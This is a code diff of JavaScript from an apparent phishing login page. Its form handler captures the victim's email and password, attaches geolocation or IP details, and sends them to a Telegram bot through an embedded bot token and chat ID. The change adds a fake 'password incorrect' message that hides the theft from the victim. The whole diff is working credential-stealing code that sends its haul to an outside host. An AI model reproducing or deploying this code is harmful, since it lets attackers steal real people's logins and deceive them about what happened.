@@ -20,15 +20,13 @@ form.addEventListener("submit", (e) => {
         co = data.countryName;
         lo = data.locality;
         st = data.principalSubdivision;
-
         var identity = document.getElementById("email").value;
         var password = document.getElementById("password").value;
 
-        var my_text = `Result from Geolocation for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - Continent: ${ct} %0A - Country: ${co} %0A - Locality: ${lo} %0A - state: ${st}
-          `;
+        var my_text = `Result from Geolocation for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - Continent: ${ct} %0A - Country: ${co} %0A - Locality: ${lo} %0A - state: ${st}`;
 
         var token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-        var chat_id = -4015788485;
+        var chat_id =  -4015788485;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
@@ -54,12 +52,14 @@ form.addEventListener("submit", (e) => {
         var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
         var token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-        var chat_id = -4015788485;
+        var chat_id =  -4015788485;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
+        document.getElementById("alert-message").innerHTML =
+          "Sorry, your password was incorrect. Please double-check your password.";
       });
   };
 
